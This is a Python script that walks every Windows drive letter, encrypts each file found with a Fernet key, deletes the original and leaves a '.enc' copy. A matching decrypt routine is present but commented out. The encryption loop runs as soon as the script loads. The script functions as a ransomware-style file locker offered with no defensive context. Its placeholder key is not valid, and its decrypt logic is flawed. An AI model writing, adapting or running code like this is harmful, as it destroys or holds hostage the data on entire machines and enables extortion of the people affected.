from cryptography.fernet import Fernet
import os

# Encryption key
key = 'your-encryption-key-here'
cipher = Fernet(key.encode())

# List all drives
def list_all_drives():
    drives = []
    for letter in range(ord('A'), ord('Z') + 1):
        drive = chr(letter) + ':\\'
        if os.path.isdir(drive):
            drives.append(drive)
    return drives

# List all files in a directory
def list_all_files(directory):
    all_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            all_files.append(os.path.join(root, file))
    return all_files

# Encrypt files
def encrypt_files(directory):
    files = list_all_files(directory)
    for file_path in files:
        try:
            with open(file_path, 'rb') as file:
                data = file.read()
            encrypted_data = cipher.encrypt(data)
            os.remove(file_path)
            with open(file_path + '.enc', 'wb') as file:
                file.write(encrypted_data)
            print(f"Encrypted {file_path} to {file_path}.enc")
        except Exception as e:
            print(f"Failed to encrypt {file_path}: {e}")

# Decrypt files
def decrypt_files(directory):
    files = list_all_files(directory)
    for file_path in files:
        enc_file_path = file_path + '.enc'
        if os.path.exists(enc_file_path):
            try:
                with open(enc_file_path, 'rb') as file:
                    encrypted_data = file.read()
                decrypted_data = cipher.decrypt(encrypted_data)
                os.remove(enc_file_path)
                with open(file_path, 'wb') as file:
                    file.write(decrypted_data)
                print(f"Decrypted {enc_file_path} to {file_path}")
            except Exception as e:
                print(f"Failed to decrypt {enc_file_path}: {e}")

# Process all drives
for drive in list_all_drives():
    print(f"Processing drive: {drive}")
    encrypt_files(drive)
    # Uncomment the line below to enable decryption
    # decrypt_files(drive)


